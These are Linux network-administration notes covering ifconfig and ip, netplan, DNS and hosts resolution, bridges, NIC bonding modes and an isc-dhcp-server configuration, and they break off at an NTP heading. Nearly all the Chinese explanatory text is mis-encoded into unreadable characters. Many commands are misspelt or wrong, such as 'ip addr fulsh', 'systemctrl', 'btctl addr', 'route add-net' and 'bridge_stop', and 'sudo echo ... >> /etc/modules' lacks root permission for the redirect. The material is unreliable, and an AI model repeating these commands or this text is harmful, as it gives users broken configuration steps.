    <content type="text"><![CDATA[ç½‘ç»œåŸç† ping 127.0.0.1 å¦‚æœèƒ½é€šï¼Œè¯´æ˜æœ¬æœºçš„TCP/IPåè®®å·²ç»é…ç½®æˆåŠŸå•¦arping ç½‘å¡é…ç½®ç½‘å¡æ¥å£-enp2s0 (æœ€è¿‘ä½¿ç”¨)ã€eth0 ï¼ˆä»¥å‰è¿™ä¹ˆä½¿ç”¨ï¼‰ #wl å¼€å¤´çš„æ˜¯æ— çº¿ç½‘å¡ # ifconfig å‘½ä»¤ # æŸ¥çœ‹æ‰€æœ‰ç½‘å¡ ifconfig -a å­—æ®µæ„ä¹‰ï¼šMTU,å‘åŒ…ï¼Œæ”¶åŒ…ï¼Œ`collisions`å‘ç”Ÿå¤šå°‘æ¬¡å†²çª # ip å‘½ä»¤ ip link # æŸ¥çœ‹æ‰€æœ‰ç½‘å¡å’Œä¿¡æ¯ ip address # lshw æŸ¥çœ‹ç³»ç»Ÿç¡¬ä»¶å‘½ä»¤ # åªæŸ¥çœ‹ç½‘å¡çš„å‘½ä»¤ sudo lshw -class network ç®¡ç†ç½‘å¡# æŸ¥çœ‹ç½‘å¡å‚æ•° sud ethtool enp0s3 # -s é…ç½® ï¼š speed é€Ÿåº¦ åŠåŒå·¥ sud ethtool -s duplex half | full speed 1000 ç½‘ç»œåŸºæœ¬è®¾ç½®## ä¸´æ—¶è®¾ç½®IPåœ°å€ sudo ifconfig eth0 10.0.0.00 netmask 255.255.255.0 # 24ä½æ©ç  sudo ifconfig eth0 10.0.0.100/24 # è®¾ç½®ç½‘å…³ gw sudo route add default gw 10.0.0.1 eth0 # ç½‘æ®µè·¯ç”± add-net ï¼ˆé™æ€è·¯ç”±ï¼šå»å“ªä¸ªç½‘æ®µï¼Œåº”è¯¥æ€ä¹ˆè½¬å‘ï¼‰ sudo route add-net 0.0.0.0 netmask 0.0.0.0 gw 1.1.1.1 # ä¸»æœºè·¯ç”± add-host sudo route add-host 2.2.2.2 gw 1.1.1.1 # æ¸…é™¤ç½‘å¡é…ç½® ip addr fulsh eth0 # å‘ç½‘ç»œä¸­è¦ä¸€ä¸ªIP sudo dhcpclient # ç¦ç”¨ç½‘å¡ sudo ifconfig eth0 down # å¯ç”¨ç½‘å¡ sudo ifconfig eth0 up # é‡å¯ç½‘ç»œæœåŠ¡ sudo systemctrl restart networking.service ç½‘å¡é…ç½®æ–‡ä»¶/etc/network/interfaces æ–‡ä»¶å­—æ®µï¼š iface ç½‘å¡name inet ç½‘ç»œé…ç½®ï¼ˆloopback/dhcp/staticï¼‰ sudo eth0 iface eth0 inet static|DHCP # pre-up ç³»ç»Ÿå¯åŠ¨ä¸­(ç½‘å¡è¿è¡Œå‰) è®¾ç½®ä¸º1000Mï¼Œå…¨åŒå·¥ pre-up/sbin/ethtool -s eth0 speed 1000 duplex full åŠ¨æ€è·å–IPåœ°å€# sudo vim /etc/network/interfaces auto eth0 iface inet dhcp é™æ€IPåœ°å€ä¸€èˆ¬æœåŠ¡å™¨æ˜¯é™æ€çš„IP # sudo vim /etc/network/interfaces auto eth0 iface inet static address 192.168.123.9 netmask 255.255.255.0 # æ©ç  gateway 192.168.123.1 # ç½‘å…³ dns-nameservers 192.168.123.1 202.99.96.68 # ä¸€èˆ¬dnsåœ°å€å†™ä¿© # ä¸Šé¢æ˜¯åŸºæœ¬é…ç½®, ä¸‹é¢æ˜¯é¢å¤–å…¶ä»–é…ç½®é¡¹ broadcast 192.168.123.255 # ç½‘æ®µçš„å¹¿æ’­åœ°å€ # dns-search abc.com # å¦‚æœå±äºæŸä¸ªdnsåŸŸ,å°±é»˜è®¤å»æ‰¾è¿™ä¸ª up route add -net 172.16.0.0/24 gw 192.168.23.1 eth0 # å¼€æœºä¹‹å,æ·»åŠ ä¸€ä¸ªç½‘æ®µ(è¦æŒ‡å®šå…·ä½“ç½‘å…³) mtu 1460 # æŒ‡å®šMTU å­—èŠ‚ # hwaddress 00:11:22:33:44:55 # æŒ‡å®šç¡¬ä»¶macåœ°å€ # åˆ·æ–°,é‡å¯ç½‘ç»œ, é…ç½®æ–‡ä»¶çš„ç½‘ç»œç”Ÿæ•ˆ(å®åœ¨ä¸è¡Œå°±é‡å¯è®¡ç®—æœº) sudo ip address fulsh eth0 sudo systemctrl restart networking.service æŒ‡å®šè·¯ç”±æ¸…é™¤ä¿¡æ¯ip addr flush ens32 Noteï¼š VmWareå¯¹ç½‘ç»œçš„æ”¯æŒè¦å¥½äºVirtualBox(æ¯”å¦‚æœ‰äº›ç½‘ç»œçš„é…ç½®å¯èƒ½æœ‰é™åˆ¶) Ubuntu 1804é…ç½®é™æ€ipubuntu18.04 serverï¼Œå¯ç”¨äº†æ–°çš„ç½‘ç»œå·¥å…·netplanï¼Œå¯¹äºå‘½ä»¤è¡Œé…ç½®ç½‘ç»œå‚æ•°è·Ÿä¹‹å‰çš„ç‰ˆæœ¬æœ‰æ¯”è¾ƒå¤§çš„å·®åˆ«ï¼Œç°åœ¨ä»‹ç»å¦‚ä¸‹ï¼š å…¶ç½‘ç»œé…ç½®æ–‡ä»¶æ˜¯æ”¾åœ¨/etc/netplan/50-cloud-init.yaml, ç¼ºçœæ˜¯ç”¨dhcpæ–¹å¼ï¼Œå¦‚æœè¦é…ç½®é™æ€åœ°å€ï¼Œåˆ™éœ€è¦ä¿®æ”¹æ­¤æ–‡ä»¶çš„æƒ³å…³å†…å®¹ï¼Œè§å¦‚ä¸‹çš„ä¾‹å­ï¼š network: version: 2 ethernets: ens33: addresses: [192.168.1.20/24] # å¯ä»¥æ˜¯è¿™ç§æ•°ç»„å½¢å¼[1.1.1.1, 192.168.1.20/24]ä¹Ÿå¯ä»¥æ˜¯ä¸‹é¢é‚£æ · dhcp4: false gateway4: 192.168.1.1 nameservers: addresses: [192.168.1.1] optional: true æˆ–è€…ä¸‹é¢è¿™ä¸ªæ ¼å¼(å¯èƒ½æ›´æ¸…æ™°ï¼Œæœ‰ipv6) # the datasource. Changes to it will not persist across an instance. # To disable cloud-init's network configuration capabilities, write a file # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: # network: {config: disabled} # å‰å‡ é¡¹å¿…å¡«ï¼Œå…¶ä»–æ ¹æ®éœ€è¦å¡«å†™ network: version: 2 ethernets: eth0: addresses: - å…¬å…±ipv4åœ°å€/20æ©ç  - ç§æœ‰ipv4åœ°å€/16 - å…¬å…±ipv6åœ°å€/64 dhcp4: false gateway4: "å…¬å…±ipv4ç½‘å…³" gateway6: å…¬å…±ipv6ç½‘å…³ match: macaddress: MACåœ°å€(ä¸å¿…é¡») nameservers: # DNS addresses: - "67.207.67.2" - "67.207.67.3" set-name: eth0 2.ä½¿å…¶ç”Ÿæ•ˆçš„æ–¹æ³•ï¼š sudo netplan apply å¦‚æœé…ç½®æœ‰é—®é¢˜ä¼šæŠ¥é”™ï¼Œå¦‚æœæ²¡é—®é¢˜ï¼Œåˆ™ä¼šæ–°çš„é…ç½®ä¼šç«‹å³ç”Ÿæ•ˆã€‚ æ³¨æ„ï¼šæ­¤æ–¹æ³•åªæ˜¯é’ˆå¯¹ubuntu18.04 Serverç‰ˆï¼Œå¯¹äº18.04 desktopå®ƒç¼ºçœæ˜¯ä½¿ç”¨NetworkMangeræ¥è¿›è¡Œç®¡ç†ï¼Œå¯ä½¿ç”¨å›¾å½¢ç•Œé¢è¿›è¡Œé…ç½®ï¼Œå…¶ç½‘ç»œé…ç½®æ–‡ä»¶æ˜¯ä¿å­˜åœ¨ï¼š/etc/NetworkManager/system-connectionsç›®å½•ä¸‹çš„ï¼Œè·ŸServerç‰ˆåŒºåˆ«è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ã€‚ netplan å·¥å…·è¿˜æœ‰å…¶å®ƒæ¯”è¾ƒä¸°å¯Œçš„åŠŸèƒ½ï¼Œè¯¦ç»†å¯å‚è§å…¶çš„è¯´æ˜æ–‡æ¡£ã€‚ DNSé…ç½®DNSé…ç½®æ–‡ä»¶/etc/resolve.conf /etc/resolve.conf # DNSè®¾ç½®ï¼ˆè½¯è¿æ¥ï¼‰ æ ¼å¼: nameserver 114.114.114.114 nameserver 127.0.0.53 options edns0 search www.tendawifi.com ä¸»æœºåè§£æ1.é…ç½®æ–‡ä»¶ /etc/hosts ä¼˜å…ˆçº§åˆ«é«˜äºresolve.confé‡Œé¢çš„dnsæœåŠ¡å™¨çš„ä¿¡æ¯ # ip å’Œåç§°åšè§£æ 127.0.0.1 localhost 192.168.0.111 www.qq.com # ç°åœ¨è¿™é‡Œæ‰¾æ˜ å°„ï¼Œæœ‰çš„è¯å°±ä¸å»resolveé‡Œé¢æ‰¾äº† 2.é…ç½®æ–‡ä»¶ /etc/nsswitch.conf åç§°è§£æé¡ºåºé…ç½®æ–‡ä»¶ # æŒ‰ç…§ä¼˜å…ˆçº§å…ˆåæ’åºæ¥è§£æ ï¼ˆå‰é¢çš„ä¸æ»¡è¶³ï¼Œæ‰è°ƒç”¨åé¢çš„ï¼‰ - files /etc/hosts - Resolve å…¨ç§°systemd-resolved.service(ç¼“å­˜ã€localhostã€æœ¬æœºå) ï¼ˆé»˜è®¤å®‰è£…ï¼‰ - [NOTFOUND=return] ç»“æœå³æƒå¨ ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰ ï¼ˆå½“æ‰¾ä¸ç»™æˆ‘åˆ°çš„ä¹‹åï¼Œè¿”å›ï¼‰ - dns dnsæœåŠ¡å™¨ï¼ˆresolveæ–‡ä»¶é…ç½®çš„é‚£äº›ï¼‰ - mdns4_minimal MulticastDNS(å¤šæ’­dnsæœåŠ¡) ç°åœ¨å¾ˆå¤šdnså‚å®¶ç”¨çš„å°±æ˜¯å¤šæ’­dnsæœåŠ¡ # hosts: files mdns4_minimal [NOTFOUND=return] dns myhostname å…³äºè§£æä¼˜å…ˆçº§ï¼šæœ‰çš„æ”»å‡»è€…ä¼šä¿®æ”¹ä½ hostsæ–‡ä»¶æ˜ å°„åˆ°è‡ªå·±çš„æ¶æ„ç½‘å€ï¼Œæ­¤æ—¶å¦‚æœæŠŠdnsçš„é¡ºåºæ”¾åˆ°hostså‰é¢ï¼Œä»–å°±åˆ©ç”¨ä¸æˆäº† æŸ¥çœ‹è·¯ç”±# è·¯ç”±ä¿¡æ¯ route -n netstat -nr ç½‘æ¡¥é…ç½® æŠŠæœåŠ¡å™¨å½“äº¤æ¢æœºç”¨å®åœ¨æ˜¯å¤§æå°ç”¨æŠŠå¤šä¸ªä»¥å¤ªç½‘æ®µä»¥ä¸Šå±‚é€æ˜çš„æ–¹å¼è¿æ¥åœ¨ä¸€èµ· åº”ç”¨åœºæ™¯ï¼š 1.å¯åšé˜²ç«å¢™2.å¯ä»¥åšè™šæ‹Ÿæœºçš„æœåŠ¡å™¨ï¼ˆæ­å»ºäº‘å¹³å°ï¼Œè¿›è¡Œè™šæ‹ŸåŒ–çš„æ—¶å€™ï¼‰3.æ¡¥æ¥æœ‰çº¿ç½‘ä¸æ— çº¿ç½‘ï¼ˆæ¯”å¦‚æˆ‘çš„ç¬”è®°æœ¬ï¼šè¿æ¥ç½‘çº¿è®¿é—®äº’è”ç½‘ï¼Œå¦å¤–è®©åˆ«äººé€šè¿‡æˆ‘çš„ç”µè„‘æ— çº¿ä¸Šç½‘ï¼Œç›¸å½“äºä¸€ä¸ªAPï¼‰4.é“¾è·¯è£èª‰å®¹é”™ï¼ˆéœ€å¯ç”¨STPï¼‰5.é€šè¿‡ç½‘æ¡¥ç®¡ç†å·¥å…·å®ç° bridge-utils åœ¨ubunutæ­å»ºç½‘æ¡¥åœ¨è™šæ‹Ÿæœºæ·»åŠ 2å—ç½‘å¡(ä¸€å—NATï¼Œå¦ä¸€å—éšä¾¿) å®‰è£…ç½‘æ¡¥ç®¡ç†åŒ…ï¼š sudo apt install bridge-utils ä¸´æ—¶é…ç½®ç½‘æ¡¥ï¼š å‘½ä»¤ï¼š btctl sudo btctl addr br0 # æ·»åŠ ä¸€ä¸ªç½‘æ¡¥çš„ç½‘å¡æ¥å£ sudo btctl addif br0 eth0 eth1 # å¾€ç½‘æ¡¥æ¥å£æ·»åŠ 2å—ç½‘å¡ # sudo ifconfig eth0 down # æŠŠç½‘å¡downæ‰ sudo ifconfig eth0 0.0.0.0 up # 2è€…çš„ipå˜æ²¡äº† sudo ifconfig eth1 0.0.0.0 up sudo ifconfig br0 1.1.1.1/24 up # æ‰‹åŠ¨é…ç½®ç½‘æ¡¥ç½‘å¡çš„ipå¹¶up sudo dhclient br0 # æˆ–è€… dhcpè‡ªåŠ¨è·å–ç½‘æ¡¥ç½‘å¡çš„ipåœ°å€ sudo route add default gw 1.1.1.10 # æ·»åŠ ä¸€ä¸ªç½‘å…³ï¼Œå°±å¯ä»¥è®¿é—®å¤–ç½‘äº† æŒä¹…é…ç½®ç½‘æ¡¥ï¼šä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š /etc/network/interfaces auto eth0 iface eth0 inet manual auto eth1 iface eth1 inet manual auto br0 iface br0 inet dhcp # dncp ï¼Œ ä¹Ÿå¯ä»¥staticï¼Œä¸‹é¢æ‰‹åŠ¨é…ç½®addressï¼Œnetmaskå’Œgateway bridge_ports eth0 eth1 # åŠ å…¥ç½‘å¡ bridge_stop off #å…³é—­ç”Ÿæˆæ ‘ ,ä¹Ÿå¯ä»¥ onå¼€å¯æˆæ ‘ï¼Œå‚ä¸ç”Ÿæˆæ ‘è®¡ç®— ä¿®æ”¹ä¿å­˜ï¼Œç„¶å é‡å¯ç½‘ç»œæœåŠ¡/é‡å¯æœåŠ¡å™¨ æŸ¥çœ‹ç½‘æ¡¥è¿è¡ŒçŠ¶æ€ sudo brctl showæŸ¥çœ‹macæƒ…å†µsudo brctl showmacs br0æŸ¥çœ‹ç”Ÿæˆæ ‘æƒ…å†µsudo brctl showstp br0 ç½‘å¡ç»‘å®š (ç»å¸¸ä½¿ç”¨) è¿˜è®°å¾—å°æ—¶å€™è¿™æ®µä¸€æŠŠç­·å­çš„æ•…äº‹å— å®ç°å¤šå—ç½‘å¡çš„ç»‘å®šï¼Œå®ç°é«˜å¯ç”¨ã€è´Ÿè½½å‡è¡¡ã€æ›´å¤§å‘æŒ¥èƒ½åŠ› ä¸€äº›å¸¸ç”¨ç§°å‘¼ï¼šBonding == Port Trunking == Link aggregation(é“¾è·¯èšåˆ) == Team ç›®çš„ï¼šå°†å¤šä¸ªç‰©ç†ç½‘å¡ç»„åˆä¸ºä¸€ä¸ªé€»è¾‘ç½‘å¡ é«˜å¯ç”¨ã€è´Ÿè½½å¹³è¡¡ã€é«˜ååé‡ é…ç½®ï¼šåœ¨è™šæ‹Ÿæœºåšå®éªŒï¼šå…ˆç»™è™šæ‹Ÿæœºæ·»åŠ è‡³å°‘ä¸¤å—ç½‘å¡ 1.ç¬¬ä¸€æ­¥ sudo echo bonding >> /etc/modules # æ·»åŠ å†…æ ¸æ”¯æŒ sudo modprobe bonding # æ‰‹åŠ¨åŠ è½½å†…æ ¸(ä¸´æ—¶)ï¼Œ modeprobeåŠ è½½bonding ifconfig -a # å¯ä»¥çœ‹åˆ°è‡ªåŠ¨ç”Ÿæˆäº†ä¸€ä¸ªbonding0çš„ç½‘å¡(ä½†æ˜¯æ²¡æœ‰up) sudo systemctl stop networking # æ°¸ä¹…é…ç½®ï¼Œæ–‡ä»¶ # sudo vim /etc/network/interfaces bounding # æ·»åŠ ä¸€ä¸ªæ¨¡å— # é‡å¯æœåŠ¡ sudo systemctl restart networking 2.é…ç½®ç½‘å¡é…ç½®æ–‡ä»¶ # Mode 1 é…ç½® # sudo vim /etc/network/interfaces auto eth0 iface eth0 inet manual bond-master bond0 # ç»‘å®šåˆ°å“ªä¸ªboundä¸Š bond-primary eth0 # é»˜è®¤åšçš„ä¸»çš„ç½‘å¡ auto eth01 iface eth01 inet manual bond-master bond0 # å¤‡çš„ç½‘å¡ï¼Œåå•†è¦ç»‘å®šé‚£ä¸ª auto bond0 iface bond0 inet dhcp # è®©ipåœ°å€dhcpï¼› æˆ–è€…static æ‰‹åŠ¨åˆ¶å®š bond-mode 1 # ç»‘å®šæ¨¡å¼ active-backup bond-miimon 100 # æ•…éšœæ£€æµ‹é—´éš”ï¼š 100ms bond-slaves none # æŒ‡å®šä½œä¸ºçš„çš„æˆå‘˜çš„ç½‘å¡, è¿™é‡Œå†™noneæ˜¯å› ä¸ºï¼šåŠ å…¥åœ¨è‡ªå·±ç‰©ç†ç½‘å¡ç‰‡æ®µé‡Œé¢å†™äº† -- # é‡å¯æœåŠ¡ sudo systemctl restart networking PS: ç»‘å®šæ¨¡å¼bound-mode 1 ä¸€ä¸ªä¸»ï¼Œä¸€ä¸ªå¤‡(ä¸»çš„æ•…éšœåæ‰å·¥ä½œ) ä¹Ÿå«ï¼š active-backup 6ç§æ¨¡å¼Mode 0 ï¼š round-robin(è½®è¯¢) ç½‘ç»œæµé‡ï¼ˆæ•°æ®åŒ…ï¼‰ é¡ºåºå¹³å‡åˆ†é…ç»™Bondä¸­æ‰€æœ‰ç‰©ç†ç½‘å¡ï¼ˆå¯ä»¥åŒæ—¶ä½¿ç”¨ä¸‰ä¸ªç½‘å¡å‘é€å’Œæ¥æ”¶æ•°æ®ï¼‰ é«˜å¯ç”¨ï¼ˆå®¹é”™ï¼Œä¸€ä¸ªåäº†ï¼Œå¦ä¸€ä¸ªç½‘å¡æ¥ç®¡ï¼‰ã€è´Ÿè½½å‡è¡¡ï¼ˆå¤šä¸ªç½‘å¡ï¼Œå•ç‹¬æ˜¯ï¼Œå°±æ˜¯æ‹¥æœ‰äº†å¤šGçš„å¸¦å®½ï¼‰ Mode 1 : ative-backup Bondä¸­åªæœ‰ä¸€ä¸ªç½‘å¡Activeï¼Œ å…¶ä»–ç½‘å¡å…¨éƒ¨Stanbyï¼ˆæ•ˆç‡å¹¶ä¸æ˜¯å¾ˆé«˜ï¼‰ å¯¹å¤–åªæœ‰ä¸€ä¸ªç½‘å¡çš„MACåœ°å€å¯è§ é«˜å¯ç”¨å®ç°ä¸äº†è´Ÿè½½å‡è¡¡ï¼Œæœ‰å¤šä¸ªæ¥å£ä¹Ÿæ²¡ç”¨ Mode 2: balance-XOR æ ¹æ®æºç›®çš„MAC/IP/Portè¿›è¡Œè®¡ç®—ï¼Œç¡®å®šä»å“ªä¸ªç½‘å¡å‘å‡ºï¼ˆæ€§èƒ½ä¼˜äºMode0ï¼‰ é«˜å¯ç”¨ï¼Œè´Ÿè½½å‡è¡¡ ï¼ˆXOR â€” &gt; å¼‚æˆ–ï¼‰åªè¦ä¸å‡ºç°æ•…éšœï¼Œä¸æ”¹å˜macåœ°å€ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨çš„ç¬¬ä¸€ä¸ªç‰©ç†ç½‘å¡è¿›è¡Œçš„é€šä¿¡ï¼Œä»¥åæ‰€æœ‰çš„é€šä¿¡éƒ½æ˜¯ç»§ç»­ä½¿ç”¨ç¬¬ä¸€ä¸ªç‰©ç†ç½‘å¡æµé‡ä¸æ˜¯å¹³å‡çš„ Mode 3 broadcast å‘åŒ…å¹¿æ’­ç»™Bondä¸­æ‰€æœ‰ç½‘å¡ï¼Œæä¾›æœ€çŸ­çš„æ•…éšœæ¢å¤æ—¶é—´ï¼Œåº”ç”¨è¿æ¥ä¸ä¸­æ–­ é«˜å¯ç”¨ Mode 4 802.3adï¼ˆDynamic link aggregationï¼‰ é“¾è·¯èšåˆLACPç»„å†…çš„ç½‘å¡ä½¿ç”¨ç›¸åŒé€Ÿç‡ã€åŒå·¥è®¾ç½® è¦æ±‚ï¼šè®¡ç®—æœºå®‰è£…ethtoolï¼›äº¤æ¢æœºæ”¯æŒIEEE802.3adæ ‡å‡†ï¼Œå¹¶è¿›è¡Œé¢å¤–é…ç½® é«˜å¯ç”¨ã€è´Ÿè½½å‡è¡¡ Mode 5 balance-tlb ï¼ˆAdaptive transmit load balancingï¼‰ éš§é“ç»‘å®šä¸éœ€è¦ä¸Šè¿äº¤æ¢æœºé¢å¤–é…ç½®ï¼Œæ ¹æ®ç½‘å¡è´Ÿè½½å‡ºç«™è´Ÿè½½å‡è¡¡ é«˜å¯ç”¨ã€è´Ÿè½½å‡è¡¡ Mode 6: balance-alb (Adaptive load balance) Mode 5 + balance-rlb (å…¥ç«™æµé‡è´Ÿè½½å‡è¡¡) Bondé©±åŠ¨æ‹¦æˆªæœ¬æœºçš„ARPå“åº”åŒ…ï¼Œä½¿ç”¨ä¸åŒç½‘å¡ç¡¬ä»¶MACæ›¿æ¢æºMAC ä¸åŒçš„å¯¹ç«¯ä½¿ç”¨ä¸åŒçš„æœåŠ¡å™¨MACåœ°å€ï¼Œå®ç°å…¥ç«™è´Ÿè½½å‡è¡¡ ä¸éœ€è¦ä¸Šè¿äº¤æ¢æœºé¢å¤–é…ç½® æŸ¥çœ‹bondç«¯å£å’ŒçŠ¶æ€cat /proc/net/bonding/bond0 Model 4 é…ç½®# sudo vim /etc/network/interfaces auto eth0 # å…¶ä»–ç‰©ç†ç½‘å¡é…ç½®é¡¹åŒ iface eth0 inet manual bond-master boud0 # ç»‘å®šåˆ°å“ªä¸ªboundä¸Š auto bon d0 iface bond0 inet dhcp # è®©ipåœ°å€dhcpï¼› æˆ–è€…static æ‰‹åŠ¨åˆ¶å®š bond-mode 4 # ç»‘å®šæ¨¡å¼ active-backup bond-miimon 100 # æ•…éšœæ£€æµ‹é—´éš”ï¼š 100ms bond-lacp-rate 1 # æ¯1så‘é€LACPDUï¼ˆé»˜è®¤ä¸º0ï¼Œå³30sï¼‰ bond-slaves eth0 eth1 # æŒ‡å®šä½œä¸ºçš„çš„æˆå‘˜çš„ç½‘å¡ DHCPæœåŠ¡é€šå¸¸ç»™å®¢æˆ·ç«¯è‡ªåŠ¨åˆ†é…IPåœ°å€ Dynamic Host Configuration Protocol é€æ˜çš„é…ç½®ç½‘ç»œå‚æ•° IP/æ©ç ã€ç½‘å…³ã€DNSã€åŸŸåã€æ—¶é—´æœåŠ¡å™¨ã€æ‰“å°æœåŠ¡å™¨(å¸¸ç”¨çš„å‚æ•°æ˜¯å‰ä¸‰ä¸ª) é€šè¿‡åœ°å€ç§Ÿçº¦å¾ªç¯ä½¿ç”¨IPåœ°å€ï¼ˆæœ‰ç§Ÿçº¦æœŸï¼Œå¾ªç¯åˆ©ç”¨ï¼‰ åŸºäºUDPï¼Œ æ ‡å‡†ä½¿ç”¨ ç«¯å£ï¼š 67(æœåŠ¡ç«¯)ï¼Œ68(å®¢æˆ·ç«¯) ps: ä¸€èˆ¬ä¼ä¸šï¼Œdhcpéƒ½åœ¨æ ¸å¿ƒäº¤æ¢æœºä¸Šï¼Œåªæœ‰å½“ä¼ä¸šç½‘ç»œéå¸¸å¤§å¤æ‚æ—¶å€™ï¼Œæ‰ä¼šå•ç‹¬ä½¿ç”¨ä¸€ä¸ªæœåŠ¡å™¨æ¥æä¾›dhcpæœåŠ¡ è¯·æ±‚å’Œåˆ†é…æ­¥éª¤ï¼š 1.å®¢æˆ·ç«¯å‘ç”Ÿç¬¬ä¸€ä¸ªå¹¿æ’­(äºŒå±‚ï¼Œå› ä¸ºæ­¤æ—¶è¿˜æ²¡æœ‰ip)ï¼Œæ•°æ®åŒ…ï¼šdhcp discover2.dhcpæœåŠ¡å™¨å›å¤æ•°æ®åŒ…dhcp offer3.å®¢æˆ·ç«¯å°±å†å‘ä¸€ä¸ªå¹¿æ’­åŒ…dhcp request4.æœåŠ¡å™¨ç«¯å‘é€æ•°æ®åŒ…ackï¼Œ åŒ…å«ipç­‰å‚æ•°ï¼Œæ ‡è®°è¿™ä¸ªipä¸ºå·²åˆ†é… å®‰è£…1.åœ¨vmwareä¸Šï¼Œæ‰“å¼€è™šæ‹Ÿç½‘ç»œè®¾ç½®ï¼Œä»¥vmnet8ä¸ºä¾‹ï¼Œå…³é—­vmwareè‡ªå¸¦çš„dhcpæœåŠ¡ï¼ˆå¦‚æœåŒæ—¶æœ‰ä¸¤å°dhcpæœåŠ¡:ä½¿ç”¨å“åº”å¿«çš„æœåŠ¡æä¾›çš„ipï¼‰ï¼Œå°†è¿™å°è™šæ‹Ÿæœºä½¿ç”¨natï¼Œè®©å…¶ä»–è™šæ‹Ÿæœºéƒ½ä½¿ç”¨è¿™å°è™šæ‹Ÿæœºçš„dhcpæœåŠ¡ï¼ŒæŠŠè¿™ä¸ªè™šæ‹Ÿæœºä¿®æ”¹ä¸ºé™æ€ip, ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/network/inertfaceåˆ°vmnet8çš„ç½‘æ®µï¼Œsudo ip addr fulsh eth0æ¸…é™¤åŸæ¥é…ç½®ï¼Œé‡å¯ç½‘ç»œæœåŠ¡ 2.å®‰è£…dhcpæœåŠ¡çš„è½¯ä»¶åŒ… # è¿™é‡Œç”¨çš„iscçš„ sudo apt install isc-dhcp-server 3.é…ç½®dhcpæœåŠ¡ Noteï¼šèƒ½ä¸å®‰è£…çš„æœåŠ¡å’Œè½¯ä»¶å°±ä¸è¦å®‰è£…ï¼Œåéå¿…é¡»ï¼Œå°±ä¸å¯ç”¨ï¼ˆç¼©å°æ”»å‡»é¢ï¼‰ ##1.å…ˆä¿®æ”¹é…ç½®æ–‡ä»¶1 #sudo vim /etc/default/isc-dhcp-server # æŒ‡å®šå¯åŠ¨DHCPæœåŠ¡çš„ç½‘å¡ INTERFACE="eth0" # è¦å¯åŠ¨shcpçš„ç½‘å¡name(ä¸€èˆ¬æ˜¯é’ˆå¯¹å†…ç½‘çš„é‚£ä¸€å—ç½‘å¡)ï¼Œå¯ä»¥å¤šä¸ªç½‘å¡ï¼ˆç©ºæ ¼éš”å¼€ï¼‰ ##2.å†ä¿®æ”¹ä¸»é…ç½®æ–‡ä»¶ï¼ˆæŒ‡å®šåœ°å€æ± å’Œé€‰é¡¹ï¼‰ #sudo vim /etc/dhcp/dhcpd.conf #optionåªå¯¹dhcpçš„ä½œç”¨åŸŸèµ·æ•ˆï¼›å…¶ä»–çš„å¾ˆå¯¹æ•´ä¸ªæœåŠ¡å™¨èµ·æ•ˆ #ä¸€è‡´çš„é…ç½®å†™åœ¨æ–‡ä»¶èµ·å§‹ä½ç½®ï¼Œå…¶ä»–çš„ä¸ªæ€§çš„å•ç‹¬è®¾ç½®åœ¨å„ä¸ªç½‘æ®µçš„ä½ç½® default-lease-time 600; #ç§Ÿçº¦æœŸé™ï¼Œ å•ä½ï¼šs max-lease-time 7200; #æœ€å¤§ç§Ÿçº¦æœŸé™(åˆ°è¾¾æ—¶é—´çš„ä¸€åŠï¼Œå°±åˆ·æ–°ä½¿ç”¨æœŸï¼›å¦‚æœåˆ°è¾¾æœ€å¤§æ—¶é—´ï¼Œå°±é‡æ–°é€šè¿‡dhcpè·å–) authoritative; #å¯ç”¨ä¹‹åï¼Œè¯æ˜è¿™ä¸ªæ˜¯æƒå¨çš„æˆæƒdhcpæœåŠ¡å™¨ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç½‘ç»œä¸­å¦‚æœå‡ºç°å…¶ä»–çš„dhcpå°±ä¸ä¼šå½±å“äº†ï¼‰ #é…ç½®åœ°å€æ± (å¯ä»¥æ‰‹åŠ¨å†™ï¼Œä¹Ÿå¯ä»¥åœ¨åŸæ³¨é‡Šçš„åŸºç¡€ä¸Šé…ç½®) ç½‘æ®µ subnet 10.1.8.0 netmask 255.255.255.0 { range 10.1.8.100 10.1.8.200; #å¯åˆ†é…çš„åœ°å€æ®µ option routers 10.1.8.1; #ç½‘å…³åœ°å€ option domain-name-servers 192.168.1.1,192.168.1.2; #dnsæœåŠ¡å™¨åœ°å€ï¼Œå¤šä¸ªç”¨é€—å·éš”å¼€; ä¸€èˆ¬é…åˆ°è¿™é‡Œå°±å¤Ÿäº† option ntp-server 1.1.1.1; #æ—¶é—´æœåŠ¡å™¨ option domain-name "local.lan"; #ç»Ÿä¸€çš„åŸŸå } ##3.é‡å¯æœåŠ¡ #å®¢æˆ·ç«¯ä¸€äº›æ“ä½œ ipconfig /all ipconfig /release # é‡Šæ”¾è¿™ä¸ªip ipconfig /renew #é‡æ–°è·å–ip 3.ç‰¹æ®Šæƒ…å†µ(æŒ‡å®šæŸä¸ªipåªåˆ†é…ç»™æŸå°è®¡ç®—æœºï¼ŒIPä¿ç•™) é€šè¿‡MACåœ°å€æ¥è¯†åˆ«`bash #sudo vim /etc/dhcp/dhcpd.conf host yourname { hardware ethernet 00:11:22:33:44:55; fixed-address 10.1.8.8; #å°½é‡ç”¨ä¸Šé¢åœ°å€æ± ä»¥å¤–çš„åœ°å€} #ä¿å­˜ï¼Œé‡å¯ ###### æ—¥å¸¸çš„ç»´æŠ¤ æ—¥å¿—ä¸çŠ¶æ€æŸ¥è¯¢ ```bash #æœåŠ¡å™¨åœ°å€ç§Ÿçº¦ç»“æœï¼ˆå¯æŸ¥çœ‹åˆ†å‘è¯¦ç»†ä¿¡æ¯ï¼‰ cat /var/lib/dhcp/dhcpd.leases #ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶(å®¢æˆ·ç«¯ç›´æ¥å…³æœºä¸ä¼šè®°å½•ï¼Œreleaseçš„æ—¶å€™ä¼šè®°å½•) tail -f /var/log/syslog #æŸ¥çœ‹æœåŠ¡è¿è¡ŒçŠ¶æ€ systemctl status isc-dhcp-server.service #å®¢æˆ·ç«¯æ¥æŸ¥çœ‹è·å¾—åœ°å€å†å²(å®¢æˆ·ç«¯æ˜¯Linuxæ—¶) less /var/lib/dhcp/dhcpd.leases â€‹ NTPæœåŠ¡ ï¼ˆç½‘ç»œæ—¶é—´åè®®ï¼‰ æ—¶é—´éƒ½å»å“ªäº† æ—¶é—´è¡¨å‡†ï¼š GMTï¼šæ 